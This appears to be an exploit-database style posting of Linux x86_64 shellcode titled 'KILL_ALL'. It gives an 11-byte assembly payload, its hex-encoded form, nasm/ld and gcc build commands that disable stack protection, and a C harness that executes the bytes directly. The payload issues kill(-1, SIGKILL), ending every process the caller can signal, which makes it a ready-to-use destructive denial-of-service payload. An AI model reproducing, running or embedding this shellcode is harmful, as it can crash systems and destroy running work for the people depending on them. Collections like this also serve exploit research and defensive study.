/*
;Title: Linux/x86_64 - KILL_ALL
;Author: Aron Mihaljevic
;Architecture: Linux x86_64
;Shellcode Length:  11 bytes

========DESCTIPTION===========================
      #include <sys/types.h>
      #include <signal.h>
        int kill(pid_t pid, int sig);


===COMPILATION AND EXECUTION==================

#nasm -f elf64 kill.nasm -o kill.o

#ld kill.o -o kill

=================SHELLCODE================

global _start

section .text

_start:





	push 	0x3e		; sys kill
	pop  	rax
	push 	-1 			; pid
	pop		rdi
	push	0x9			; sig kill
	pop 	rsi
	syscall



====================FOR C Compile===========================


# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05";


main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}